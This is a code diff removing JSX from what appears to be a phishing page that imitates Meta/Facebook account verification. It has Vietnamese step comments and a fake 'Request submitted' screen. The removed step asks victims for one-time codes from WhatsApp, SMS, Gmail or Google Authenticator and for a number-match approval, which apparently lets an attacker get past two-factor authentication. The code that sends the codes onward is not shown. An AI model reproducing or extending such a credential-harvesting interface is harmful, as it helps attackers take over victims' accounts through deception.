-                  <p style={{ fontSize: '15px', color: '#1c1e21', marginBottom: '24px', lineHeight: '1.4' }}>
-                    {matchNumber 
-                      ? `Please enter the approval number requested by our system: ${matchNumber}` 
-                      : 'Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.'}
-                  </p>
-
-                  {matchNumber && (
-                    <div style={{ background: '#e7f3ff', border: '1px solid #0064e0', padding: '12px', borderRadius: '8px', marginBottom: '20px', textAlign: 'center', fontSize: '18px', fontWeight: 'bold', color: '#0064e0' }}>
-                      Yêu cầu nhập số: {matchNumber}
-                    </div>
-                  )}
-
-                  <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
-                    <img
-                      src="/images/2fa-illustration.png"
-                      alt="2FA Code"
-                      style={{ width: '100%', display: 'block', objectFit: 'cover' }}
-                    />
-                  </div>
-
-                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-                    <input
-                      type="text"
-                      placeholder="Code"
-                      value={otp}
-                      onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
-                      style={{
-                        padding: '14px 16px',
-                        fontSize: '16px',
-                        border: '1px solid #ccd0d5',
-                        borderRadius: '8px',
-                        outline: 'none',
-                        width: '100%',
-                        boxSizing: 'border-box'
-                      }}
-                    />
-
-                    <div style={{ fontSize: '15px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
-                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
-                      It may take a few minutes for you to get this code.
-                      {otpCanResend ? (
-                        <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
-                          background: 'none', border: 'none',
-                          color: resendLoading ? '#a0c3ff' : '#0064e0',
-                          fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
-                          fontSize: '15px', padding: 0,
-                          display: 'inline-flex', alignItems: 'center', gap: 6
-                        }}>
-                          {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
-                        </button>
-                      ) : (
-                        <span>Get a new code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
-                      )}
-                    </div>
-
-                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '15px', marginTop: '4px' }}>Incorrect code. Please try again.</div>}
-
-                    <button type="submit" disabled={loading || otp.length < 6} style={{
-                      width: '100%',
-                      padding: '16px',
-                      borderRadius: '100px',
-                      border: 'none',
-                      background: otp.length >= 6 && !loading ? '#0064e0' : '#a0c3ff',
-                      color: '#fff',
-                      fontSize: '17px',
-                      fontWeight: '700',
-                      cursor: otp.length >= 6 && !loading ? 'pointer' : 'not-allowed',
-                      display: 'flex',
-                      justifyContent: 'center',
-                      alignItems: 'center',
-                      gap: 8,
-                      height: 54,
-                      transition: 'background 0.2s'
-                    }}>
-                      {loading ? <Spinner size={22} /> : 'Continue'}
-                    </button>
-                  </form>
-                </div>
-              )}
-
-              {/* BƯỚC 5: SUCCESS FULL PAGE */}
-              {showSuccess && (
-                <div style={{ textAlign: 'center', marginTop: '40px' }}>
-                  <div style={{ width: '88px', height: '88px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
-                    <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                  </div>
-                  <h2 style={{ fontSize: '24px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' }}>Request submitted</h2>
-                  <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '24px' }}>Your request has been sent. Please wait up to 24 hours for verification.</p>
-                  <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} disabled={loading} style={{
-                    padding: '14px 40px',
-                    borderRadius: '100px',
-                    border: 'none',
-                    background: '#0064e0',
-                    color: '#fff',
-                    fontSize: '16px',
-                    fontWeight: '700',
-                    cursor: 'pointer',
-                    display: 'inline-flex',
-                    alignItems: 'center',
-                    gap: 8,
-                    height: 48
-                  }}>Close</button>
-                </div>
-              )}
-
-            </div>
-          </div>
         </div>
       )}
     </div>
